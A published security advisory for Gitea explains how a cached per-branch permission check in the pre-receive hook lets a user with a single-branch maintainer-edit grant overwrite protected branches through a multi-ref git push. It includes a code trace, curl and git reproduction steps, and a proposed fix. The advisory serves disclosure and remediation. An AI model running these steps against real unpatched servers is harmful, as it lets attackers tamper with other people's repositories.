# [H] Gitea: Cached Per-Branch Permission Check in Pre-Receive Hook Allows Full Repository Write

## Summary
Severity: High
Advisory: GHSA-649p-mmhf-85c7
CVE: CVE-2026-27775
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-649p-mmhf-85c7
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.3

## Details
## Vulnerability Header

| Field               | Value                                                                               |
| ------------------- | ----------------------------------------------------------------------------------- |
| Vulnerability Title | Cached Per-Branch Permission Check in Pre-Receive Hook Allows Full Repository Write |
| Severity Rating     | High                                                                                |
| Bug Category        | Authorization Bypass                                                                |
| Location            | `routers/private/hook_pre_receive.go:55-64`, `CanWriteCode()`                       |
| Affected Versions   | 1.25.5                                                                              |

## Executive Summary

The pre-receive hook in Gitea evaluates the `CanMaintainerWriteToBranch` permission only once per `git push` session and caches the result for all subsequent refs in the same batch. An attacker who has a legitimate per-branch write grant (e.g., via an open pull request with "Allow edits from maintainers" enabled) can batch-push that branch together with any other ref. The cached `true` from the first ref is reused for all following refs, allowing the attacker to overwrite protected branches (including `main`), create arbitrary new branches, and push tags. This effectively escalates a single-branch maintainer-edit grant into full repository write access.

## Root Cause Analysis

### Technical Description

When processing a multi-ref `git push`, the `HookPreReceive` handler at `hook_pre_receive.go:107` iterates over all incoming refs. For each branch ref, `preReceiveBranch` (`:140`) updates `ctx.branchName` to the current branch (`:142`) and then calls `AssertCanWriteCode()` (`:144`).

`CanWriteCode()` (`:55-64`) checks whether the user can write to the repository. On the first call, it evaluates `issues_model.CanMaintainerWriteToBranch(ctx, userPerm, ctx.branchName, user)` and stores the result in a boolean flag (`canWriteCode`) with a guard (`checkedCanWriteCode`). On all subsequent calls within the same batch, it returns the cached boolean without re-evaluating against the now-different `ctx.branchName`.

This means the permission check is branch-specific in its inputs but session-scoped in its caching — a classic check-vs-use divergence.

A second contributing factor is the AGit-flow relaxation at `routers/web/repo/githttp.go:190-192` (and `routers/private/serv.go:337-338`), which downgrades the outer `receive-pack` access gate from `Write` to `Read` when `git.DefaultFeatures().SupportProcReceive` is true (git ≥ 2.29). This allows a user with only Read access on a repository to initiate a `receive-pack` session, deferring all authorization to the pre-receive hook — which contains the caching bug described above.

### First Faulty Condition

| File      | `routers/private/hook_pre_receive.go` |
| --------- | ------------------------------------- |
| Line      | 55-64                                 |
| Condition | `CanWriteCode()` evaluates the branch-specific `CanMaintainerWriteToBranch` check only on the first invocation and caches the result, reusing it for all subsequent refs in the batch regardless of which branch they target. |

### Trace Analysis

The following is the path from the attacker's `git push` to the authorization fault:

1. `POST /{owner}/{repo}.git/git-receive-pack` → `routers/web/repo/githttp.go:437` (`ServiceReceivePack`) → `httpBase()` (`:60`)
   - Access gate is downgraded from Write to Read at `:190-192` due to AGit-flow support.

2. `git receive-pack` invokes the pre-receive hook → `cmd/hook.go:184` (`runHookPreReceive`) → `modules/private/hook.go:96` (`HookPreReceive`) → internal API → `routers/private/hook_pre_receive.go:107` (`HookPreReceive`)

3. Loop at `:117` iterates over all refs in the batch. For each branch ref, `preReceiveBranch` (`:140`) sets `ctx.branchName` at `:142`.

4. **Fault**: `AssertCanWriteCode()` (`:144`) → `CanWriteCode()` (`:55-64`).
   - First ref (`feature-branch`): `checkedCanWriteCode` is false → evaluates `CanMaintainerWriteToBranch(ctx, userPerm, "feature-branch", user)` → returns `true` (legitimate grant) → caches result.
   - Second ref (`main`): `checkedCanWriteCode` is already true → returns cached `true` **without re-evaluating** against `"main"`.

5. Hook returns 200 → `git receive-pack` accepts all refs → `main` is overwritten in the victim's repository.

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector               | Network                                                                             |
| --------------------------- | ----------------------------------------------------------------------------------- |
| Authentication required     | Low                                                                                 |
| User interaction required   | Required. Victim must enable "Allow edits from maintainers" on their PR             |
| Reachable in default config | Yes                                                                                 |
| Entry point                 | `git push` over smart-HTTP or SSH with multiple refs in a single operation          |

The attacker gains full write access to the victim's repository — equivalent to having push permissions on all refs. By controlling the order of refs in the batch (e.g., naming the granted branch so it sorts first), the attacker reliably ensures the legitimate ref is evaluated before the target. This is not a race condition; it is deterministic.

### Reproduction Steps

**Environment**
The issue was reproduced using Gitea v1.25.5 on Ubuntu 24.04.4 LTS.

**Prerequisites:** 
* a Gitea instance with two users, `attacker` and `victim`.

```bash
# 1. Attacker creates a repository (e.g., a popular open-source project)
curl -X POST "http://attacker:pw@<gitea>/api/v1/user/repos" \
  -H "Content-Type: application/json" \
  -d '{"name": "project", "auto_init": true}'

# 2. Victim forks attacker's repository (standard contributor workflow)
curl -X POST "http://victim:pw@<gitea>/api/v1/repos/attacker/project/forks" \
  -H "Content-Type: application/json" \
  -d '{}'

# 3. Victim creates a feature branch on their fork and commits a change
curl -X POST "http://victim:pw@<gitea>/api/v1/repos/victim/project/branches" \
  -H "Content-Type: application/json" \
  -d '{"new_branch_name": "feature-branch", "old_branch_name": "main"}'

curl -X POST "http://victim:pw@<gitea>/api/v1/repos/victim/project/contents/contribution.txt" \
  -H "Content-Type: application/json" \
  -d '{"message": "Add contribution", "content": "'$(echo -n "victim contribution" | base64)'", "branch": "feature-branch"}'

# 4. Victim opens a PR from their feature branch into attacker/project
#    with "Allow edits from maintainers" enabled
curl -X POST "http://victim:pw@<gitea>/api/v1/repos/attacker/project/pulls" \
  -H "Content-Type: application/json" \
  -d '{"title": "Feature PR", "head": "victim:feature-branch", "base": "main", "allow_maintainer_edit": true}'
```

At this point, the attacker (as maintainer of the base repo `attacker/project`) has a per-branch write grant on the victim's fork, scoped to the `feature-branch` branch only.

**Attack**

The attacker works from their own repo (`attacker/project`)
```bash
# 5. Attacker clones their own repo
git clone http://attacker:pw@<gitea>/attacker/project.git && cd project

# 6. Attacker fetches the victim's PR branch
git fetch -u http://<gitea>/victim/project feature-branch:victim-feature-branch
git checkout victim-feature-branch

# 7. Attacker adds a commit to the PR branch
echo "legitimate change" > feature.txt && git add . && git commit -m "PR update"

# 8. Attacker also prepares a malicious commit on main
git checkout main
echo "MALICIOUS CONTENT" > PWNED && git add . && git commit -m "pwned"

# 9. Attacker pushes both refs to the victim's fork in a single operation — this is the exploit
git push http://attacker:pw@<gitea>/victim/project.git victim-feature-branch:feature-branch main:main

# 10. The change on both refs is visible regardless of PR status
```

**Expected result**: 
`main` should be rejected ("User permission denied for writing").

**Actual result**: 
Both refs are accepted. `victim/project:main` now contains the attacker's malicious commit.

```bash
# Verify: victim checks their fork's main branch
curl "http://victim:pw@<gitea>/api/v1/repos/victim/project/contents/PWNED?ref=main"
# Returns attacker's "MALICIOUS CONTENT" — main has been overwritten
```

The same technique also works for pushing arbitrary tags (`refs/tags/*`) and creating new branches.

## Recommended Fix

Remove the caching in `CanWriteCode()` — the `CanMaintainerWriteToBranch` check must be evaluated for every ref in the batch, not cached after the first call. The `checkedCanWriteCode` / `canWriteCode` fields on `preReceiveContext` and the guard in `CanWriteCode()` at `hook_pre_receive.go:55-64` should be removed, so the permission is evaluated fresh each time `preReceiveBranch` or `preReceiveTag` calls it. `loadPusherAndPermission()` already has its own caching (`loadedPusher`), so the per-call cost is limited to the `CanMaintainerWriteToBranch` query.

See [diff.patch](https://github.com/user-attachments/files/28831842/diff.patch) for the proposed fix.

Patch provenance: AI-generated, human-reviewed.

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Adrian Denkiewicz** at **Doyensec** in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-649p-mmhf-85c7
- https://nvd.nist.gov/vuln/detail/CVE-2026-27775
- https://github.com/go-gitea/gitea/pull/38151
- https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.3
